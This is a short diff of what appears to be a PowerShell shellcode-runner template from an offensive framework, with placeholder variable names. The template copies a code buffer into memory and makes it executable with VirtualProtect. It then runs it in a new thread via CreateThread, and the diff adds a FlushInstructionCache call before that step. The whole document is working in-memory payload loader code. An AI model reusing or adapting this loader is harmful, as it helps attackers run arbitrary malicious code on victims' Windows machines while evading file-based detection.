@@ -24,6 +24,7 @@ $%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctio
 
 [System.Runtime.InteropServices.Marshal]::Copy($%{var_code}, 0, $%{var_buffer}, $%{var_code}.length)
 if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualProtect), (%{func_get_delegate_type} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($%{var_buffer}, [Uint32]$%{var_code}.Length, 0x10, [Ref]$%{var_opf})) -eq $true) {
-        $%{var_hthread} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero)
+	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll FlushInstructionCache), (%{func_get_delegate_type} @([IntPtr], [IntPtr], [UIntPtr]) ([Bool]))).Invoke([IntPtr](-1), $%{var_buffer}, [UIntPtr]$%{var_code}.Length) | Out-Null
+	$%{var_hthread} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll CreateThread), (%{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$%{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero)
         [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll WaitForSingleObject), (%{func_get_delegate_type} @([IntPtr], [Int32]))).Invoke($%{var_hthread},0xffffffff) | Out-Null
 }
